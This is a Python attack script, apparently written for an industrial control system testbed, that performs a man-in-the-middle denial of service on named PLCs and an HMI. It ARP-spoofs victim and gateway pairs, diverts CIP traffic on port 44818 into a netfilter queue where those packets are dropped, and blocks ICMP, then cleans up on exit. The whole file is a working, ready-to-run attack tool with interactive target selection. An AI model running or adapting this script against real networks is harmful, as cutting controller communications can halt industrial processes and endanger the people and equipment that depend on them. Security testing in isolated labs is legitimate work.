#!/usr/bin/env python3
import os
import sys
import time
import threading
from netfilterqueue import NetfilterQueue
from scapy.all import ARP, send, getmacbyip, IP, TCP

###########################################
# Known IP Mappings:
###########################################
HOST_INFO = {
    "SFPLC100": "10.0.0.101",
    "PLC100": "10.0.0.111",
    "SFPLC200": "10.0.0.102",
    "PLC200": "10.0.0.112",
    "SFPLC300": "10.0.0.103",
    "PLC300": "10.0.0.113",
    "HMI":    "10.0.0.150",
}

###########################################
# CIP port & Attacker config
###########################################
CIP_PORT = 44818
ATTACKER_IP = "10.0.0.200"

# Store each DoS pair (victim_ip, gateway_ip, victim_mac, gateway_mac) here
dos_pairs = []

# Run a single netfilter queue callback that drops CIP packets from all victim IPs
VICTIM_IPS = set()

# ARP spoof control variable
arp_spoof_running = True


def resolve_ip_or_name(user_input: str) -> str:
    """
    If user_input matches a known host name in HOST_INFO,
    return the mapped IP. Otherwise, assume user_input is already an IP.
    """
    upper = user_input.upper()
    if upper in HOST_INFO:
        return HOST_INFO[upper]
    else:
        return user_input  # assume an actual IP string was provided


def dos_callback(packet):
    """
    If packet is CIP from any victim IP in VICTIM_IPS, drop it. Otherwise accept.
    """
    scapy_pkt = IP(packet.get_payload())
    if scapy_pkt.haslayer(TCP):
        src_ip = scapy_pkt.src
        sport  = scapy_pkt[TCP].sport
        dport  = scapy_pkt[TCP].dport

        # If from victim IP and CIP port => drop
        if src_ip in VICTIM_IPS and sport == CIP_PORT:
            print(f"[*] Dropping CIP packet from victim {src_ip}:{sport} -> {scapy_pkt.dst}:{dport}")
            packet.drop()
            return

    # Otherwise accept
    packet.accept()


def arp_spoof_loop():
    """
    Continuously ARP-spoofs each victim↔gateway pair.
    """
    print("[*] Starting ARP spoof loop. Ctrl+C to stop or kill this script.")
    global arp_spoof_running

    while arp_spoof_running:
        for pair in dos_pairs:
            # Make victim think attacker is gateway
            arp_spoof(pair["victim_ip"], pair["victim_mac"], pair["gateway_ip"])
            # Make gateway think attacker is victim
            arp_spoof(pair["gateway_ip"], pair["gateway_mac"], pair["victim_ip"])
        time.sleep(2)

    print("[*] ARP spoof loop ended.")


def arp_spoof(target_ip, target_mac, spoof_ip):
    """
    Trick 'target_ip' into thinking attacker has the MAC for 'spoof_ip'.
    """
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(pkt, verbose=False)


def restore_arp(ip1, mac1, ip2, mac2):
    """
    Restore ARP so ip1 sees ip2 with mac2 (and vice versa).
    """
    pkt = ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2, hwsrc=mac2)
    send(pkt, count=3, verbose=False)


def add_dos_iptables_rules(victim_ip):
    """
    Divert CIP traffic from victim to NFQUEUE #1 (source approach).
    """
    cmd_src = f"iptables -t mangle -A PREROUTING -p tcp -s {victim_ip} --sport {CIP_PORT} -j NFQUEUE --queue-num 1"
    print(f"[+] {cmd_src}")
    os.system(cmd_src)


def remove_dos_iptables_rules(victim_ip):
    cmd_src = f"iptables -t mangle -D PREROUTING -p tcp -s {victim_ip} --sport {CIP_PORT} -j NFQUEUE --queue-num 1"
    print(f"[-] {cmd_src}")
    os.system(cmd_src)


def drop_all_icmp():
    """
    Drop all ICMP traffic (pings).
    """
    print("[+] Dropping all ICMP (ping) traffic (FORWARD, INPUT, OUTPUT).")
    os.system("iptables -A FORWARD -p icmp -j DROP")
    os.system("iptables -A INPUT   -p icmp -j DROP")
    os.system("iptables -A OUTPUT  -p icmp -j DROP")


def remove_drop_all_icmp():
    print("[-] Removing ICMP drop rules.")
    os.system("iptables -D FORWARD -p icmp -j DROP")
    os.system("iptables -D INPUT   -p icmp -j DROP")
    os.system("iptables -D OUTPUT  -p icmp -j DROP")


def enable_ip_forward():
    print("[*] Enabling IP forwarding.")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def disable_ip_forward():
    print("[*] Disabling IP forwarding.")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


def main():
    global arp_spoof_running

    if os.geteuid() != 0:
        print("[!] Must run as root (sudo). Exiting.")
        sys.exit(1)

    print("=== Simple DoS Attack with Prompt ===")
    print("Drops CIP packets from multiple victim IPs by ARP-spoof + netfilter queue.\n")
    print("You can type 'SFPLC100', 'PLC100', 'SFPLC200', 'PLC200', 'SFPLC300', 'PLC300', 'HMI', or a raw IP.\n")

    # 1) Prompt for how many DoS attacks
    while True:
        try:
            num_attacks = int(input("How many DoS attacks do you want to set up?: ").strip())
            if num_attacks <= 0:
                raise ValueError
            break
        except ValueError:
            print("[!] Invalid number. Please enter a positive integer.")

    # 2) Gather (victim_ip, gateway_ip) for each
    input_pairs = []
    for i in range(1, num_attacks + 1):
        print(f"\n--- DoS Attack #{i} ---")
        user_victim  = input("Enter victim name/IP (e.g. SFPLC100) to DoS: ").strip()
        user_gateway = input("Enter gateway/IP to ARP-spoof (e.g. HMI): ").strip()

        victim_ip  = resolve_ip_or_name(user_victim)
        gateway_ip = resolve_ip_or_name(user_gateway)
        input_pairs.append((victim_ip, gateway_ip))

    # 3) Enable IP forward, drop ICMP
    enable_ip_forward()
    drop_all_icmp()

    # 4) Start netfilter queue: bind queue #1 to dos_callback
    nfqueue = NetfilterQueue()
    try:
        nfqueue.bind(1, dos_callback)
    except OSError as e:
        print(f"[!] Failed to bind NFQUEUE #1: {e}")
        sys.exit(1)

    # Launch the NFQUEUE run loop in a separate thread
    nfqueue_thread = threading.Thread(target=lambda: nfqueue.run())
    nfqueue_thread.daemon = True
    nfqueue_thread.start()

    # 5) For each pair, ARP-spoof + add CIP rules
    for (victim_ip, gateway_ip) in input_pairs:
        # Resolve MACs
        victim_mac  = getmacbyip(victim_ip)
        gateway_mac = getmacbyip(gateway_ip)
        if not victim_mac or not gateway_mac:
            print(f"[!] Could not get MAC for victim={victim_ip} or gateway={gateway_ip}. Exiting.")
            sys.exit(1)

        print(f"[*] Victim {victim_ip} MAC: {victim_mac}, Gateway {gateway_ip} MAC: {gateway_mac}")

        dos_pairs.append({
            "victim_ip": victim_ip,
            "gateway_ip": gateway_ip,
            "victim_mac": victim_mac,
            "gateway_mac": gateway_mac
        })

        # Divert CIP from victim to NFQUEUE
        add_dos_iptables_rules(victim_ip)

        # Mark victim in the set for the callback
        VICTIM_IPS.add(victim_ip)

    # 6) ARP Spoof loop
    try:
        arp_spoof_loop()
    except KeyboardInterrupt:
        pass
    finally:
        print("[*] Cleaning up: unbinding NFQUEUE, removing iptables rules, restoring ARP...")

        # Stop ARP loop
        arp_spoof_running = False

        # Wait for netfilter queue thread to exit
        nfqueue.unbind()

        # Remove CIP iptables rules
        for pair in dos_pairs:
            remove_dos_iptables_rules(pair["victim_ip"])

        # Remove ICMP drop
        remove_drop_all_icmp()

        # Restore ARP
        for pair in dos_pairs:
            restore_arp(pair["victim_ip"],  pair["victim_mac"], 
                         pair["gateway_ip"], pair["gateway_mac"])
            restore_arp(pair["gateway_ip"], pair["gateway_mac"], 
                         pair["victim_ip"],  pair["victim_mac"])

        # Disable IP forward
        disable_ip_forward()

        print("[*] DoS cleanup done. Exiting.")


if __name__ == "__main__":
    main()

